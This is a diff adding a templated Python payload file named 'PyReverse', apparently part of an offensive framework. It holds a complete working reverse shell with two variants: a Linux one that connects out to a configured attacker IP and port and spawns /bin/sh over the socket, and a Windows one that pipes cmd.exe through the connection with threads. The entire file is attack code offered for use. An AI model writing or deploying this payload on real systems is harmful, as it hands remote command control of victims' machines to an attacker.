@@ -1,0 +1,56 @@
+#!name##PyReverse
+#!types##payload
+#!info##“Reverse Shell” built in python. Select the type of the target system.
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##PyR_port##Host port##int
+#!setVar##PyR_port##4444##int
+#!reqVar##PyR_target##Target operating system. Select: 'linux' or 'windows'.##str
+#!setVar##PyR_target##windows##str
+#!import_FLAG##True
+#!redenr_FLAG##True
+
+{% if PyR_target=="linux" %}
+import os
+import socket
+import pty
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("{{IP_ADDR}}", {{PyR_port}}))
+os.dup2(sock.fileno(), 0)
+os.dup2(sock.fileno(), 1)
+os.dup2(sock.fileno(), 2)
+pty.spawn("/bin/sh")
+{%else%}
+import subprocess
+import socket
+import os
+import threading
+
+def recive(conn, shell):
+    while True:
+        recv = conn.recv(1024)
+        if recv:
+            shell.stdin.write(recv)
+            shell.stdin.flush()
+
+def send_loop(conn, shell):
+    while True:
+        conn.send(shell.stdout.read(1))
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("{{IP_ADDR}}", {{PyR_port}}))
+
+shell = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+send = threading.Thread(target=send_loop, args=(sock, shell), daemon=True)
+send.start()
+
+recv = threading.Thread(target=recive, args=(sock, shell), daemon=True)
+recv.start()
+
+try:
+    shell.wait()
+except KeyboardInterrupt:
+    sock.close()
+{%endif%}
